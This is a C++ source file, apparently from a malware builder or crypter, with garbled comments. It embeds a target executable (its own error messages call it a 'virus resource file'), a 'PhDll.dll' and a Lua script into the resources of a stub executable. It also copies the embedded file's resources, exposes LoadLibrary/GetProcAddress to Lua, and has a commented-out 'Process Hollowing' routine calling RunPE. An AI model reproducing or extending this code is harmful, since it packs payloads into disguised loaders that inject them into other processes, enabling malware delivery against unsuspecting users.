#include "PEGenerator.h"

// ==========================����������luaʹ��===================== //

// C++ ������������̬���� DLL
int l_load_library(lua_State* L) {
    const char* dll_name = luaL_checkstring(L, 1);  // ��ȡ��һ��������DLL �ļ���
    HMODULE hModule = LoadLibraryA(dll_name);  // ʹ�� LoadLibrary ���� DLL
    if (hModule) {
        lua_pushlightuserdata(L, hModule);  // �� DLL �ľ�����͵� Lua ջ
        return 1;  // ����һ��ֵ��DLL ���
    }
    else {
        lua_pushnil(L);  // �������ʧ�ܣ����� nil
        return 1;
    }
}

// C++ ������������ȡ DLL ������ַ
int l_get_proc_address(lua_State* L) {
    
    HMODULE hModule = (HMODULE)luaL_checkudata(L, 1);  // ��ȡ��һ��������DLL ���
    const char* proc_name = luaL_checkstring(L, 2);  // ��ȡ�ڶ���������������
    FARPROC funcAddr = GetProcAddress(hModule, proc_name);  // ��ȡ������ַ
    if (funcAddr) {
        lua_pushlightuserdata(L, funcAddr);  // ���غ�����ַ
        return 1;  // ����һ��ֵ��������ַ
    }
    else {
        lua_pushnil(L);  // �����ȡʧ�ܣ����� nil
        return 1;
    }
}

//------------------------------
// 1) C++ �������� Lua �ܵ��� MessageBoxA
//    show_message_box("Text", "Title")
//------------------------------
static int l_show_message_box(lua_State* L) {
    // 1) ��ȡ����
    //    - ��һ����������Ϣ�ı� (const char*), 
    //    - �ڶ������������� (const char*).
    // ����ű������ڶ��������������Ĭ��ֵ
    const char* text = luaL_checkstring(L, 1);
    const char* title = luaL_optstring(L, 2, "Message");

    // 2) ���� MessageBoxA
    //    - ������HWND=0, LPCSTR= text, LPCSTR= title, UINT=0 (MB_OK)
    int result = MessageBoxA(NULL, text, title, MB_OK);

    // 3) �� MessageBoxA �ķ���ֵѹ�� Lua ջ
    lua_pushinteger(L, result);
    return 1; // ����ֵ����=1
}

// ================================================================ //

// ������Դ����
bool update_resource(CString str_path, HANDLE hUpdate, int rid) {

    bool flag = false;

    do {

        // ��Ҫ��ӵ���Դ���ļ� phdll
        std::ifstream phfile(L"PhDll.dll", std::ios::binary);
        if (!phfile.is_open()) {
            MessageBox(NULL, L"Failed to open the ph file.", str_path, MB_OK);
        }

        // ��ȡ�ļ����ݵ��ڴ� phdll
        phfile.seekg(0, std::ios::end);
        size_t phfileSize = phfile.tellg();
        phfile.seekg(0, std::ios::beg);

        char* buffer = new char[phfileSize];
        phfile.read(buffer, phfileSize);
        phfile.close();

        // ���ļ����ݸ��µ���Դ�� phdll
        if (!UpdateResource(hUpdate, RT_RCDATA, MAKEINTRESOURCE(rid), MAKELANGID(LANG_NEUTRAL, SUBLANG_NEUTRAL), buffer, phfileSize)) {
            MessageBox(NULL, L"Failed to update the phdll to resource.", str_path, MB_OK);
            delete[] buffer;
            break;
        }

        delete[] buffer;
        flag = true;
    } while (0);
    return flag;
}

// ����ļ�����Դ���µĿ�ִ���ļ�
BOOL AddFileToResource(LPCWSTR exePath, LPCWSTR resourceFilePath, LPCWSTR newExePath, CString lua_path) {
    WCHAR tempFilePath[MAX_PATH];

    // ������ʱ�ļ�·��
    GetTempPath(MAX_PATH, tempFilePath);
    GetTempFileName(tempFilePath, L"tmp", 0, tempFilePath);

    // ����ǰ��ִ���ļ����Ƶ���ʱ�ļ�
    if (!CopyFile(exePath, tempFilePath, FALSE)) {
        MessageBox(NULL, L"Failed to create temporary file.", L"generator", MB_OK);
        return FALSE;
    }

    // ����ʱ�ļ�������Դ����
    HANDLE hUpdate = BeginUpdateResource(tempFilePath, FALSE);
    if (!hUpdate) {
        MessageBox(NULL, L"Failed to open file for resource update.", L"generator", MB_OK);
        DeleteFile(tempFilePath); // ɾ����ʱ�ļ�
        return FALSE;
    }

    // ��Ҫ��ӵ���Դ���ļ�
    std::ifstream file(resourceFilePath, std::ios::binary);
    if (!file.is_open()) {
        MessageBox(NULL, L"Failed to open the input file.", L"generator", MB_OK);
        EndUpdateResource(hUpdate, TRUE);
        DeleteFile(tempFilePath); // ɾ����ʱ�ļ�
        return FALSE;
    }

    // ��ȡ�ļ����ݵ��ڴ�
    file.seekg(0, std::ios::end);
    size_t fileSize = file.tellg();
    file.seekg(0, std::ios::beg);

    char* buffer = new char[fileSize];
    file.read(buffer, fileSize);
    file.close();

    // ���ļ����ݸ��µ���Դ��
    if (!UpdateResource(hUpdate, RT_RCDATA, MAKEINTRESOURCE(IDR_BINARY_FILE), MAKELANGID(LANG_NEUTRAL, SUBLANG_NEUTRAL), buffer, fileSize)) {
        MessageBox(NULL, L"Failed to update the resource.", L"generator", MB_OK);
        delete[] buffer;
        EndUpdateResource(hUpdate, TRUE);
        DeleteFile(tempFilePath); // ɾ����ʱ�ļ�
        return FALSE;
    }

    delete[] buffer;


    buffer = nullptr;

    // ��Ҫ��ӵ���Դ���ļ� phdll
    std::ifstream phfile(L"PhDll.dll", std::ios::binary);
    if (!phfile.is_open()) {
        MessageBox(NULL, L"Failed to open the ph file.", L"generator", MB_OK);
        EndUpdateResource(hUpdate, TRUE);
        DeleteFile(tempFilePath); // ɾ����ʱ�ļ�
        return FALSE;
    }

    // ��ȡ�ļ����ݵ��ڴ� phdll
    phfile.seekg(0, std::ios::end);
    size_t phfileSize = phfile.tellg();
    phfile.seekg(0, std::ios::beg);

    buffer = new char[phfileSize];
    phfile.read(buffer, phfileSize);
    phfile.close();

    // ���ļ����ݸ��µ���Դ�� phdll
    if (!UpdateResource(hUpdate, RT_RCDATA, MAKEINTRESOURCE(IDR_PH), MAKELANGID(LANG_NEUTRAL, SUBLANG_NEUTRAL), buffer, phfileSize)) {
        MessageBox(NULL, L"Failed to update the phdll to resource.", L"generator", MB_OK);
        delete[] buffer;
        EndUpdateResource(hUpdate, TRUE);
        DeleteFile(tempFilePath); // ɾ����ʱ�ļ�
        return FALSE;
    }

    delete[] buffer;

    if (!lua_path.IsEmpty()) {
        if (!update_resource(lua_path, hUpdate, IDR_LUA)) {
            EndUpdateResource(hUpdate, TRUE);
            DeleteFile(tempFilePath); // ɾ����ʱ�ļ�
            return FALSE;
        }
    }


    do {
        // ����Ҫ������Դ���ļ�
        HMODULE hResourceModule = LoadLibraryEx(resourceFilePath, NULL, LOAD_LIBRARY_AS_DATAFILE);
        if (!hResourceModule) {
            MessageBox(NULL, L"Failed to load virus resource file.", L"generator", MB_OK);
            break;
        }

        // ���������� resourceFilePath �е�������Դ���µĿ�ִ���ļ�
        ResourceUpdateData updateData = { hUpdate };
        if (!EnumResourceTypes(hResourceModule, EnumTypesProc, (LONG_PTR)&updateData)) {
            MessageBox(NULL, L"Failed to enumerate virus resources.", L"generator", MB_OK);
            FreeLibrary(hResourceModule);
            break;
        }

        // �ͷ���Դģ��
        FreeLibrary(hResourceModule);
    } while (0);
    // �����Դ����
    if (!EndUpdateResource(hUpdate, FALSE)) {
        MessageBox(NULL, L"Failed to finalize resource update.", L"generator", MB_OK);
        return FALSE;
    }

    // ���޸ĺ����ʱ�ļ����Ƶ�Ŀ���ļ�·��
    if (!CopyFile(tempFilePath, newExePath, FALSE)) {
        MessageBox(NULL, L"Failed to create the final output file.", L"generator", MB_OK);
        DeleteFile(tempFilePath); // ɾ����ʱ�ļ�
        return FALSE;
    }

    // ɾ����ʱ�ļ�
    DeleteFile(tempFilePath);

    MessageBox(NULL, L"Resource added successfully.", L"generator", MB_OK);
    return TRUE;
}

BOOL CALLBACK EnumTypesProc(HMODULE hModule, LPWSTR lpType, LONG_PTR lParam) {
    return EnumResourceNames(hModule, lpType, EnumNamesProc, lParam);
}

BOOL CALLBACK EnumNamesProc(HMODULE hModule, LPCWSTR lpType, LPWSTR lpName, LONG_PTR lParam) {
    return EnumResourceLanguages(hModule, lpType, lpName, EnumLangsProc, lParam);
}

BOOL CALLBACK EnumLangsProc(HMODULE hModule, LPCWSTR lpType, LPCWSTR lpName, WORD wLanguage, LONG_PTR lParam) {
    ResourceUpdateData* updateData = (ResourceUpdateData*)lParam;
    HRSRC hRes = FindResourceEx(hModule, lpType, lpName, wLanguage);
    if (!hRes) return TRUE;

    HGLOBAL hResData = LoadResource(hModule, hRes);
    if (!hResData) return TRUE;

    DWORD resSize = SizeofResource(hModule, hRes);
    void* pResData = LockResource(hResData);

    if (!UpdateResource(updateData->hUpdate, lpType, lpName, wLanguage, pResData, resSize)) {
        std::cerr << "Failed to update resource." << std::endl;
        return FALSE;
    }
    return TRUE;
}

// ����ļ�����Դ���µĿ�ִ���ļ�
BOOL AddFileToResource32(LPCWSTR exePath, LPCWSTR resourceFilePath, LPCWSTR newExePath) {
    WCHAR tempFilePath[MAX_PATH];

    // ������ʱ�ļ�·��
    GetTempPath(MAX_PATH, tempFilePath);
    GetTempFileName(tempFilePath, L"tmp", 0, tempFilePath);

    // ����ǰ��ִ���ļ����Ƶ���ʱ�ļ�
    if (!CopyFile(exePath, tempFilePath, FALSE)) {
        MessageBox(NULL, L"Failed to create temporary file.", L"generator", MB_OK);
        return FALSE;
    }

    // ����ʱ�ļ�������Դ����
    HANDLE hUpdate = BeginUpdateResource(tempFilePath, FALSE);
    if (!hUpdate) {
        MessageBox(NULL, L"Failed to open file for resource update.", L"generator", MB_OK);
        DeleteFile(tempFilePath); // ɾ����ʱ�ļ�
        return FALSE;
    }
    // ��Ҫ��ӵ���Դ���ļ�
    std::ifstream file(resourceFilePath, std::ios::binary);
    if (!file.is_open()) {
        MessageBox(NULL, L"Failed to open the input file.", L"generator", MB_OK);
        EndUpdateResource(hUpdate, TRUE);
        DeleteFile(tempFilePath); // ɾ����ʱ�ļ�
        return FALSE;
    }

    // ��ȡ�ļ����ݵ��ڴ�
    file.seekg(0, std::ios::end);
    size_t fileSize = file.tellg();
    file.seekg(0, std::ios::beg);

    char* buffer = new char[fileSize];
    file.read(buffer, fileSize);
    file.close();

    // ���ļ����ݸ��µ���Դ��
    if (!UpdateResource(hUpdate, RT_RCDATA, MAKEINTRESOURCE(IDR_BINARY_FILE), MAKELANGID(LANG_NEUTRAL, SUBLANG_NEUTRAL), buffer, fileSize)) {
        MessageBox(NULL, L"Failed to update the resource.", L"generator", MB_OK);
        delete[] buffer;
        EndUpdateResource(hUpdate, TRUE);
        DeleteFile(tempFilePath); // ɾ����ʱ�ļ�
        return FALSE;
    }

    delete[] buffer;
    buffer = nullptr;

    // ��Ҫ��ӵ���Դ���ļ� phdll
    std::ifstream phfile(L"PhDll.dll", std::ios::binary);
    if (!phfile.is_open()) {
        MessageBox(NULL, L"Failed to open the ph file.", L"generator", MB_OK);
        EndUpdateResource(hUpdate, TRUE);
        DeleteFile(tempFilePath); // ɾ����ʱ�ļ�
        return FALSE;
    }

    // ��ȡ�ļ����ݵ��ڴ� phdll
    phfile.seekg(0, std::ios::end);
    size_t phfileSize = phfile.tellg();
    phfile.seekg(0, std::ios::beg);

    buffer = new char[phfileSize];
    phfile.read(buffer, phfileSize);
    phfile.close();

    // ���ļ����ݸ��µ���Դ�� phdll
    if (!UpdateResource(hUpdate, RT_RCDATA, MAKEINTRESOURCE(IDR_PH), MAKELANGID(LANG_NEUTRAL, SUBLANG_NEUTRAL), buffer, phfileSize)) {
        MessageBox(NULL, L"Failed to update the phdll to resource.", L"generator", MB_OK);
        delete[] buffer;
        EndUpdateResource(hUpdate, TRUE);
        DeleteFile(tempFilePath); // ɾ����ʱ�ļ�
        return FALSE;
    }

    delete[] buffer;

    

    do {

        // ������Դ�ļ�
        HMODULE hResourceModule = LoadLibraryEx(resourceFilePath, NULL, LOAD_LIBRARY_AS_DATAFILE);
        if (!hResourceModule) {
            MessageBox(NULL, L"Failed to load virus resource file.", L"generator", MB_OK);
            break;
        }

        // ���������� resourceFilePath �е�������Դ���µĿ�ִ���ļ�
        ResourceUpdateData32 updateData = { hUpdate };
        if (!EnumResourceTypes(hResourceModule, EnumTypesProc32, (LONG_PTR)&updateData)) {
            MessageBox(NULL, L"Failed to enumerate virus resources.", L"generator", MB_OK);
            FreeLibrary(hResourceModule);
            break;
        }

        // �ͷ���Դģ��
        FreeLibrary(hResourceModule);
    } while (0);

    // �����Դ����
    if (!EndUpdateResource(hUpdate, FALSE)) {
        MessageBox(NULL, L"Failed to finalize resource update.", L"generator", MB_OK);
        DeleteFile(tempFilePath); // ɾ����ʱ�ļ�
        return FALSE;
    }

    // ���޸ĺ����ʱ�ļ����Ƶ�Ŀ���ļ�·��
    if (!CopyFile(tempFilePath, newExePath, FALSE)) {
        MessageBox(NULL, L"Failed to create the final output file.", L"generator", MB_OK);
        DeleteFile(tempFilePath); // ɾ����ʱ�ļ�
        return FALSE;
    }

    // ɾ����ʱ�ļ�
    DeleteFile(tempFilePath);

    MessageBox(NULL, L"Resource added successfully.", L"generator", MB_OK);
    return TRUE;
}

// ö����Դ����
BOOL CALLBACK EnumTypesProc32(HMODULE hModule, LPWSTR lpType, LONG_PTR lParam) {
    return EnumResourceNames(hModule, lpType, EnumNamesProc32, lParam);
}

// ö����Դ����
BOOL CALLBACK EnumNamesProc32(HMODULE hModule, LPCWSTR lpType, LPWSTR lpName, LONG_PTR lParam) {
    return EnumResourceLanguages(hModule, lpType, lpName, EnumLangsProc32, lParam);
}

// ö����Դ���Բ�������Դ
BOOL CALLBACK EnumLangsProc32(HMODULE hModule, LPCWSTR lpType, LPCWSTR lpName, WORD wLanguage, LONG_PTR lParam) {
    ResourceUpdateData32* updateData = (ResourceUpdateData32*)lParam;
    HRSRC hRes = FindResourceEx(hModule, lpType, lpName, wLanguage);
    if (!hRes) return TRUE;

    HGLOBAL hResData = LoadResource(hModule, hRes);
    if (!hResData) return TRUE;

    DWORD resSize = SizeofResource(hModule, hRes);
    void* pResData = LockResource(hResData);

    if (!UpdateResource(updateData->hUpdate, lpType, lpName, wLanguage, pResData, resSize)) {
        std::cerr << "Failed to update resource." << std::endl;
        return FALSE;
    }
    return TRUE;
}

//// ���� Process Hollowing �ĸ����̺߳���
//DWORD WINAPI HollowingThread(LPVOID lpParam) {
//    HANDLE hMainThread = (HANDLE)lpParam;
//
//    // ��ͣ���߳�
//    if (SuspendThread(hMainThread) == -1) {
//        return 1;
//    }
//
//    RunPE();
//
//
//}
